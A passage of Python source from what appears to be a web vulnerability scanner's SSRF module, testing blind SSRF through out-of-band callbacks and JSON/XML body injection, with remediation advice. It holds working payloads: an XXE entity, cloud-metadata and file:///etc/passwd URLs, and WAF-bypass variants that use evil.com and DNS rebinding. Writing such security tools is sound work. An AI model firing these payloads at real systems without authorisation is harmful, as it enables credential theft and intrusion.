                        internal_ip_accessed=True,
                    ),
                    param=target_param,
                )
    
    async def _test_blind_ssrf(
        self,
        client: httpx.AsyncClient,
        base_url: str,
        urls: list[str],
        rate_limiter: RateLimiter,
    ) -> None:
        """Test for blind SSRF using OOB callbacks and time-based techniques."""
        # Find URL parameter
        target_param = None
        target_url = None
        target_parsed = None

        for url in urls[:20]:
            parsed = urlparse(url)
            params = parse_qs(parsed.query)

            for param_name in params:
                if param_name.lower() in PayloadGenerator.SSRF_PARAMS:
                    target_param = param_name
                    target_url = url
                    target_parsed = parsed
                    break
            if target_param:
                break

        if not target_param:
            return

        # =====================================================================
        # OOB ENGINE INTEGRATION: Use callback-based blind SSRF detection
        # =====================================================================
        if self._oob_engine and OOB_ENGINE_AVAILABLE:
            logger.debug(f"[SSRF] Testing blind SSRF with OOB Engine on param: {target_param}")

            # Generate OOB payloads with unique tracking tokens
            oob_payloads = self._oob_engine.generate_oob_payloads(
                scan_id=self._scan_id or hashlib.md5(base_url.encode()).hexdigest()[:8],
                payload_type="ssrf",
                target_url=target_url,
                parameter=target_param,
            )

            # FN-FIX 2026-02-08: Was [:3] - test more OOB variants for blind SSRF
            for oob_payload in oob_payloads[:10]:
                await rate_limiter.acquire()

                payload_url = oob_payload["payload"]
                token = oob_payload["oob_token"]

                params = parse_qs(target_parsed.query)
                params[target_param] = [payload_url]
                query = urlencode(params, doseq=True)

                test_url = f"{target_parsed.scheme}://{target_parsed.netloc}{target_parsed.path}?{query}"

                try:
                    start = time.time()
                    response = await client.get(test_url)
                    response_time = time.time() - start

                    # Wait briefly for OOB callback (non-blocking check)
                    await asyncio.sleep(1.0)

                    # Check if callback was received
                    if self._oob_engine.check_callback(token):
                        # CONFIRMED BLIND SSRF via OOB callback!
                        callback_evidence = self._oob_engine.get_callback_evidence(token)

                        self._add_finding(
                            name="Blind SSRF Confirmed (OOB Callback)",
                            description=(
                                f"Blind SSRF vulnerability CONFIRMED via out-of-band callback. "
                                f"The server made an external request to our callback server. "
                                f"This proves the application fetches attacker-controlled URLs."
                            ),
                            severity=Severity.HIGH,
                            host=base_url,
                            endpoint=test_url,
                            result=SSRFResult(
                                vulnerable=True,
                                ssrf_type=SSRFType.HTTP_OOB if "http" in oob_payload.get("protocol", "") else SSRFType.DNS_OOB,
                                confidence_score=95,
                                payload=payload_url,
                                evidence=[
                                    f"OOB callback received for token: {token}",
                                    f"Callback type: {callback_evidence.get('first_callback', {}).get('type', 'unknown') if callback_evidence else 'unknown'}",
                                    f"Time to callback: {callback_evidence.get('time_to_callback_ms', 'N/A')}ms" if callback_evidence else "",
                                    f"Response time: {response_time:.2f}s",
                                ],
                            ),
                            param=target_param,
                        )
                        logger.info(f"🎯 [SSRF] Blind SSRF CONFIRMED via OOB callback on {target_param}")
                        return  # Found confirmed blind SSRF

                except Exception as e:
                    logger.debug(f"OOB SSRF test error: {e}")

            # Wait a bit longer for any delayed callbacks
            await asyncio.sleep(2.0)

            # Check all tokens one more time (FN-FIX: match the increased payload count)
            for oob_payload in oob_payloads[:10]:
                token = oob_payload["oob_token"]
                if self._oob_engine.check_callback(token):
                    callback_evidence = self._oob_engine.get_callback_evidence(token)

                    self._add_finding(
                        name="Blind SSRF Confirmed (Delayed OOB Callback)",
                        description=(
                            f"Blind SSRF vulnerability CONFIRMED via delayed out-of-band callback. "
                            f"The server made an external request after a delay."
                        ),
                        severity=Severity.HIGH,
                        host=base_url,
                        endpoint=target_url,
                        result=SSRFResult(
                            vulnerable=True,
                            ssrf_type=SSRFType.HTTP_OOB,
                            confidence_score=90,
                            payload=oob_payload["payload"],
                            evidence=[
                                f"Delayed OOB callback received for token: {token}",
                                f"Time to callback: {callback_evidence.get('time_to_callback_ms', 'N/A')}ms" if callback_evidence else "",
                            ],
                        ),
                        param=target_param,
                    )
                    return

        # =====================================================================
        # FALLBACK: Time-based and DNS-based detection (no OOB server)
        # =====================================================================

        # Generate unique DNS canary
        canary_id = ''.join(random.choices(string.ascii_lowercase, k=8))

        # Time-based blind SSRF payloads
        blind_payloads = [
            # Non-existent DNS
            f"http://{canary_id}.ssrf.localtest.me/",
            f"http://{canary_id}.nip.io/",
            f"http://{canary_id}.xip.io/",

            # Internal with timeout
            "http://10.255.255.1/",  # Non-routable, causes timeout
            "http://192.0.2.1/",  # TEST-NET, non-routable

            # DNS rebinding domains
            "http://make-127-0-0-1-rr.1u.ms/",
            f"http://{canary_id}.burpcollaborator.net/",
        ]

        for payload in blind_payloads[:5]:
            await rate_limiter.acquire()

            params = parse_qs(target_parsed.query)
            params[target_param] = [payload]
            query = urlencode(params, doseq=True)

            test_url = f"{target_parsed.scheme}://{target_parsed.netloc}{target_parsed.path}?{query}"

            try:
                start = time.time()
                response = await client.get(test_url)
                response_time = time.time() - start

                # Blind SSRF indicators
                evidence = []
                confidence = 0

                # Long response time indicates DNS/connection attempt
                if response_time > 3.0:
                    evidence.append(f"Extended response time: {response_time:.2f}s")
                    confidence += 30

                # Error messages indicating URL fetch attempt
                content = response.text.lower()
                fetch_indicators = [
                    "could not resolve",
                    "dns lookup",
                    "connection timed out",
                    "name resolution",
                    "failed to connect",
                    "unable to connect",
                ]

                for indicator in fetch_indicators:
                    if indicator in content:
                        evidence.append(f"Fetch indicator: {indicator}")
                        confidence += 20

                if confidence >= 40:
                    self._add_finding(
                        name="Blind SSRF Detected (Time/Error Based)",
                        description=f"Blind SSRF vulnerability detected via time/error analysis. "
                                   f"The application appears to fetch external URLs without reflecting the response. "
                                   f"Note: Use OOB callback server for higher confidence.",
                        severity=Severity.MEDIUM,
                        host=base_url,
                        endpoint=test_url,
                        result=SSRFResult(
                            vulnerable=True,
                            ssrf_type=SSRFType.BLIND,
                            confidence_score=confidence,
                            payload=payload,
                            evidence=evidence,
                        ),
                        param=target_param,
                    )
                    break

            except httpx.TimeoutException:
                # Timeout can indicate SSRF attempt
                self._add_finding(
                    name="Potential Blind SSRF (Timeout)",
                    description=f"Request timed out when testing with external URL. This may indicate blind SSRF.",
                    severity=Severity.MEDIUM,
                    host=base_url,
                    endpoint=test_url,
                    result=SSRFResult(
                        vulnerable=True,
                        ssrf_type=SSRFType.TIME_BASED,
                        confidence_score=40,
                        payload=payload,
                        evidence=["Request timeout on external URL test"],
                    ),
                    param=target_param,
                )
                break
            except Exception as e:
                logger.debug(f"Blind SSRF test error: {e}")

    # =========================================================================
    # JSON/XML BODY INJECTION (2026-02-12)
    # Tests SSRF in JSON API and XML request bodies
    # =========================================================================

    async def _test_body_injection(
        self,
        client: httpx.AsyncClient,
        base_url: str,
        urls: list[str],
        rate_limiter: RateLimiter,
    ) -> None:
        """
        Test SSRF injection in JSON and XML request bodies.

        Many modern APIs accept URLs in JSON/XML fields:
        - Webhook configurations
        - Avatar/image URLs
        - Import/export endpoints
        - OAuth/SAML configurations
        - PDF/document generators
        """
        logger.debug("[SSRF] Phase 10: Testing JSON/XML body injection")

        # SSRF payloads for body injection
        ssrf_test_urls = [
            ("http://169.254.169.254/latest/meta-data/", "aws_metadata"),
            ("http://127.0.0.1:80/", "localhost"),
            ("http://localhost/", "localhost_name"),
            ("http://[::1]/", "ipv6_localhost"),
            ("http://0.0.0.0/", "zero_ip"),
            ("http://internal.service.local/", "internal_dns"),
            ("file:///etc/passwd", "file_proto"),
            ("gopher://127.0.0.1:9000/", "gopher_proto"),
        ]

        # Don't test dangerous payloads in bug bounty mode
        if self._bug_bounty_mode:
            ssrf_test_urls = [
                ("http://example.com/test", "safe_external"),
                ("http://httpbin.org/get", "httpbin"),
            ]

        # JSON field names likely to contain URLs
        url_field_names = [
            "url", "uri", "link", "src", "source", "href", "target",
            "callback", "webhook", "redirect", "next", "return",
            "image", "avatar", "icon", "logo", "file", "path",
            "import", "export", "fetch", "load", "proxy",
        ]

        # Identify potential API endpoints
        api_endpoints = []
        for url in urls:
            url_lower = url.lower()
            if any(indicator in url_lower for indicator in [
                "/api/", "/rest/", "/v1/", "/v2/", "/webhook",
                "/import", "/export", "/upload", "/fetch",
                "/callback", "/settings", "/config",
            ]):
                api_endpoints.append(url)

        # Also try common webhook/import endpoints
        common_endpoints = [
            f"{base_url}/api/webhook",
            f"{base_url}/api/import",
            f"{base_url}/api/callback",
            f"{base_url}/api/fetch",
            f"{base_url}/api/settings",
            f"{base_url}/webhook",
            f"{base_url}/import",
        ]
        api_endpoints.extend(common_endpoints)

        # Deduplicate
        api_endpoints = list(set(api_endpoints))[:15]

        for endpoint in api_endpoints:
            for field_name in url_field_names[:5]:  # Limit fields per endpoint
                for ssrf_url, ssrf_type in ssrf_test_urls[:4]:  # Limit payloads
                    await rate_limiter.acquire()

                    # Test JSON body
                    json_body = {field_name: ssrf_url}
                    headers = {"Content-Type": "application/json"}
                    if hasattr(self, "_auth_headers"):
                        headers.update(self._auth_headers)

                    try:
                        # Test POST
                        response = await client.post(
                            endpoint,
                            json=json_body,
                            headers=headers,
                        )

                        # Check for SSRF indicators
                        is_vulnerable = False
                        evidence = []

                        # Check response for SSRF indicators
                        if response.status_code == 200:
                            content = response.text.lower()

                            # Cloud metadata response patterns
                            if any(pattern in content for pattern in [
                                "ami-id", "instance-id", "security-credentials",
                                "iam/", "meta-data", "user-data",
                            ]):
                                is_vulnerable = True
                                evidence.append("Cloud metadata in response")

                            # Local file read
                            if any(pattern in content for pattern in [
                                "root:x:", "/bin/bash", "daemon:x:",
                            ]):
                                is_vulnerable = True
                                evidence.append("Local file content in response")

                            # Internal service response
                            if any(pattern in content for pattern in [
                                "internal", "private", "admin panel",
                            ]):
                                evidence.append("Possible internal service response")

                        # Error messages indicating URL fetch attempt
                        if response.status_code in (500, 502, 503):
                            content = response.text.lower()
                            fetch_errors = [
                                "connection refused", "could not resolve",
                                "dns lookup failed", "network unreachable",
                                "connection timed out", "ssl handshake",
                            ]
                            for error in fetch_errors:
                                if error in content:
                                    evidence.append(f"Fetch error: {error}")
                                    is_vulnerable = True
                                    break

                        if is_vulnerable or len(evidence) > 0:
                            severity = "HIGH" if is_vulnerable else "MEDIUM"
                            confidence = 85 if is_vulnerable else 60

                            self._add_finding(
                                name=f"SSRF via JSON Body - {field_name}",
                                description=(
                                    f"SSRF vulnerability via JSON field '{field_name}' at {endpoint}. "
                                    f"The application processes URLs from request body without proper validation."
                                ),
                                severity=severity,
                                host=base_url,
                                endpoint=endpoint,
                                result=SSRFResult(
                                    vulnerable=is_vulnerable,
                                    ssrf_type=SSRFType.FULL if is_vulnerable else SSRFType.PARTIAL,
                                    confidence_score=confidence,
                                    payload=ssrf_url,
                                    evidence=evidence,
                                ),
                                param=field_name,
                            )
                            logger.info(f"[SSRF] JSON body SSRF found: {endpoint} field={field_name}")
                            break  # Found for this field

                    except Exception as e:
                        logger.debug(f"[SSRF] JSON body test error: {e}")
                        continue

                    # Also test XML body
                    xml_body = f"""<?xml version="1.0"?>
<!DOCTYPE foo [
  <!ENTITY xxe SYSTEM "{ssrf_url}">
]>
<root>
  <{field_name}>&xxe;</{field_name}>
</root>"""

                    try:
                        headers_xml = {"Content-Type": "application/xml"}
                        if hasattr(self, "_auth_headers"):
                            headers_xml.update(self._auth_headers)

                        response = await client.post(
                            endpoint,
                            content=xml_body,
                            headers=headers_xml,
                        )

                        # Check for XXE/SSRF via XML
                        if response.status_code == 200:
                            content = response.text.lower()
                            if any(pattern in content for pattern in [
                                "ami-id", "root:x:", "internal",
                            ]):
                                self._add_finding(
                                    name=f"SSRF via XML Body (XXE) - {field_name}",
                                    description=(
                                        f"SSRF via XXE in XML field '{field_name}' at {endpoint}. "
                                        f"External entities are processed, allowing SSRF."
                                    ),
                                    severity=Severity.CRITICAL,
                                    host=base_url,
                                    endpoint=endpoint,
                                    result=SSRFResult(
                                        vulnerable=True,
                                        ssrf_type=SSRFType.FULL,
                                        confidence_score=90,
                                        payload=ssrf_url,
                                        evidence=["XXE entity resolved"],
                                    ),
                                    param=field_name,
                                )
                                logger.info(f"[SSRF] XML/XXE SSRF found: {endpoint}")
                                break

                    except Exception as e:
                        logger.debug(f"[SSRF] XML body test error: {e}")
                        continue

    def _get_waf_bypass_payloads(self) -> list[tuple[str, str]]:
        """Get WAF bypass payloads based on detected WAF."""
        bypass_payloads = []
        base_ip = "127.0.0.1"
        
        # All obfuscated variants
        for variant in IPObfuscator.get_all_variants(base_ip):
            bypass_payloads.append((f"http://{variant}/", f"Obfuscated: {variant}"))
        
        # Additional bypass techniques
        bypass_payloads.extend([
            ("http://0/", "Zero IP"),
            ("http://127.1/", "Shortened localhost"),
            ("http://127.0.1/", "Alternative localhost"),
            ("http://2130706433/", "Decimal IP"),
            ("http://0x7f.0x0.0x0.0x1/", "Hex octets"),
            ("http://0177.0.0.1/", "Octal first octet"),
            ("http://127.0.0.1%00.evil.com/", "Null byte bypass"),
            ("http://127.0.0.1%09/", "Tab bypass"),
            ("http://127.0.0.1%0d%0a/", "CRLF bypass"),
            ("http://127。0。0。1/", "Full-width dots"),
            ("http://①②⑦.0.0.1/", "Unicode numbers"),
            ("http://127.0.0.1#@evil.com/", "Fragment bypass"),
            ("http://evil.com@127.0.0.1/", "Credential bypass"),
            ("http://127.0.0.1:80/", "Explicit port"),
            ("http://127.0.0.1:80#@evil.com/", "Port + fragment"),
            ("http://[::ffff:127.0.0.1]/", "IPv6 mapped"),
            ("http://[0:0:0:0:0:ffff:127.0.0.1]/", "Full IPv6 mapped"),
            # FN-M3 FIX: Additional IP obfuscation variants
            ("http://[::1]/", "IPv6 localhost"),
            ("http://[0::1]/", "IPv6 localhost alt"),
            ("http://[fe80::1%25eth0]/", "IPv6 Zone ID (URL-encoded)"),
            ("http://127-0-0-1.nip.io/", "DNS rebind dash"),
            ("http://localtest.me/", "DNS rebind localtest"),
            ("http://127.0.0.1.sslip.io/", "DNS rebind sslip"),
            ("http://0.0.0.0/", "Any address"),
            ("http://0.0.0.0:80/", "Any address with port"),
            ("http://192.0.0.170/", "IETF reserved (192.0.0/24)"),
        ])
        
        # Add cloud metadata bypasses
        metadata_bypasses = [
            ("http://169.254.169.254.nip.io/latest/meta-data/", "DNS rebind AWS"),
            ("http://169.254.169.254.xip.io/latest/meta-data/", "DNS rebind xip AWS"),
            ("http://0xa9fea9fe/latest/meta-data/", "Hex AWS metadata IP"),
            ("http://2852039166/latest/meta-data/", "Decimal AWS metadata IP"),
            ("http://0251.0376.0251.0376/latest/meta-data/", "Octal AWS metadata IP"),
            ("http://[::ffff:169.254.169.254]/latest/meta-data/", "IPv6 mapped AWS"),
        ]
        bypass_payloads.extend(metadata_bypasses)
        
        return bypass_payloads
    
    def _add_finding(
        self,
        name: str,
        description: str,
        severity: str,
        host: str,
        endpoint: str,
        result: SSRFResult,
        param: str,
    ) -> None:
        """Add a finding to the results."""
        # Determine CVSS score
        cvss_scores = {
            "CRITICAL": 9.8,
            "HIGH": 8.6,
            "MEDIUM": 6.5,
            "LOW": 3.5,
        }
        
        finding = Finding(
            vuln_type=VulnType.SSRF,
                        category=VulnCategory.SERVER_SIDE,
            name=name,
            severity=severity,
            description=description,
            host=host,
            endpoint=endpoint,
            evidence=result.evidence + [
                f"Payload: {result.payload}",
                f"Confidence: {result.confidence}%",
                f"SSRF Type: {result.ssrf_type.name}",
            ],
            cvss_score=cvss_scores.get(severity, 6.5),
            cwe_id="CWE-918",
            remediation=self._get_remediation(result),
            references=[
                "https://owasp.org/www-community/attacks/Server_Side_Request_Forgery",
                "https://cheatsheetseries.owasp.org/cheatsheets/Server_Side_Request_Forgery_Prevention_Cheat_Sheet.html",
                "https://portswigger.net/web-security/ssrf",
            ],
        )
        
        # Add additional context
        if result.cloud_provider:
            finding.evidence.append(f"Cloud Provider: {result.cloud_provider.value}")
        if result.service_discovered:
            finding.evidence.append(f"Service Discovered: {result.service_discovered}")
        if result.response_data:
            finding.evidence.append(f"Response Preview: {result.response_data[:200]}...")
        
        self.findings.append(finding.to_dict())
        
        logger.info(
            f"🚨 SSRF Found [{severity}] - {name} | "
            f"Confidence: {result.confidence}% | Param: {param}"
        )
    
    def _get_remediation(self, result: SSRFResult) -> str:
        """Get context-specific remediation advice."""
        base_remediation = (
            "1. Validate and sanitize all user-supplied URLs.\n"
            "2. Implement an allowlist of permitted domains/IPs.\n"
            "3. Block requests to private/internal IP ranges (10.x, 172.16-31.x, 192.168.x, 127.x).\n"
            "4. Block requests to link-local addresses (169.254.x.x).\n"
            "5. Disable unnecessary URL schemes (file://, gopher://, dict://, etc.).\n"
            "6. Use a dedicated DNS resolver that blocks internal IPs.\n"
            "7. Implement network segmentation to isolate sensitive services.\n"
        )
        
        if result.metadata_leaked:
            base_remediation += (
                "\n\nCLOUD METADATA SPECIFIC:\n"
                "8. Use IMDSv2 on AWS with hop limit of 1.\n"
                "9. Block access to metadata IP (169.254.169.254) at network level.\n"
                "10. Use VPC endpoints instead of metadata service.\n"
                "11. Apply restrictive security groups to instance roles.\n"
            )
        
        if result.ssrf_type == SSRFType.PROTOCOL_SMUGGLE:
            base_remediation += (
                "\n\nPROTOCOL SMUGGLING SPECIFIC:\n"
                "8. Restrict allowed URL schemes to http:// and https:// only.\n"
                "9. Validate URL scheme before processing.\n"
                "10. Use URL parsing libraries that reject unusual schemes.\n"
            )
        
        return base_remediation


# Export version
__all__ = ["SSRFScanner", "SSRF_SCANNER_VERSION"]
